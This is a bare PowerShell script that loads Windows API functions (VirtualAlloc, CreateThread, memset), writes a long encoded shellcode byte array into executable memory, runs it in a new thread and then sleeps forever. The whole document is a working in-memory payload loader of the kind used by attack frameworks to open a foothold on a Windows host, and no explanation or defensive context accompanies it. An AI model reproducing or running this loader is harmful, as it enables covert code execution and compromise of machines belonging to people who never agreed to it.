$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x4b,0x33,0x12,0xf0,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0x44,0xd1,0xe7,0x0c,0xb2,0x97,0x08,0xed,0x42,0xf8,0x81,0x08,0x73,0x38,0xf5,0x59,0x23,0x88,0x7d,0x0f,0xcf,0x63,0xd3,0xa4,0x44,0x01,0xfc,0xcb,0xed,0xac,0xda,0xe2,0xee,0x9d,0x1f,0x64,0x6c,0xdc,0x73,0x46,0x4d,0x2f,0x86,0x87,0x8a,0x52,0x6b,0xd5,0x43,0x18,0xde,0xca,0xe0,0x54,0xe3,0x61,0xba,0x79,0x63,0x95,0x0a,0x7b,0x42,0x08,0x01,0x22,0x44,0xaa,0xc6,0x5e,0xcd,0xb4,0x0b,0x5a,0x87,0x4f,0xff,0x10,0x16,0x86,0xce,0xd9,0xb5,0xe7,0xff,0x2b,0xc7,0x20,0xc7,0xd3,0xb2,0x58,0x34,0x69,0xc5,0x9e,0x47,0xb5,0x40,0x05,0xef,0x3e,0xf2,0xe1,0x0e,0x92,0x65,0x61,0x1c,0x5f,0xe1,0x2d,0x00,0x5e,0x26,0x46,0x3c,0xeb,0xc9,0x89,0xb5,0xaf,0xed,0x0d,0x9e,0x74,0x8f,0x14,0x7a,0xda,0xb0,0x47,0x25,0x83,0x14,0x03,0xcb,0xd0,0x24,0x4e,0x83,0x15,0x05,0x71,0x53,0x32,0x1e,0x02,0x61,0x9d,0xb4,0x8c,0xc9,0x56,0x13,0x4a,0x2e,0x4d,0xe3,0xc4,0xd1,0x6e,0x14,0xcc,0x15,0x3a,0x44,0x66,0xbc,0x43,0x0f,0x76,0x41,0x96,0x80,0x26,0xed,0x49,0x61,0x97,0x4d,0x3a,0x09,0xfd,0x42,0x65,0x29,0xfe,0x89,0x0e,0xc0,0x04,0x59,0x62,0xe9,0x8b,0xef,0xec,0x13,0x94,0x1e,0xb1,0x9a,0x72,0x4a,0x59,0xcb,0x2d,0xe2,0xc0,0x56,0xa5,0x93,0x0d,0x4d,0xc3,0x93,0x86,0x62,0x33,0x5d,0x6f,0x0e,0x27,0x09,0x9f,0x45,0x15,0x9f,0xa0,0x73,0x30,0x1f,0x35,0x78,0x93,0x48,0xa1,0x82,0xc2,0xbe,0x6e,0x7c,0x21,0xb5,0xa7,0xe8,0x8a,0xa1,0xc7,0xfc,0x0a,0x31,0x9e,0x96,0x0a,0x59,0x46,0xc3,0x58,0x7c,0x89,0xde,0xcc,0x2d,0x1c,0xe1,0xa4,0x82,0xb7,0x89,0x4a,0xfd,0xf0,0x15,0xb4,0x28,0x01,0x69,0x63,0x14,0x77,0x83,0xb7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
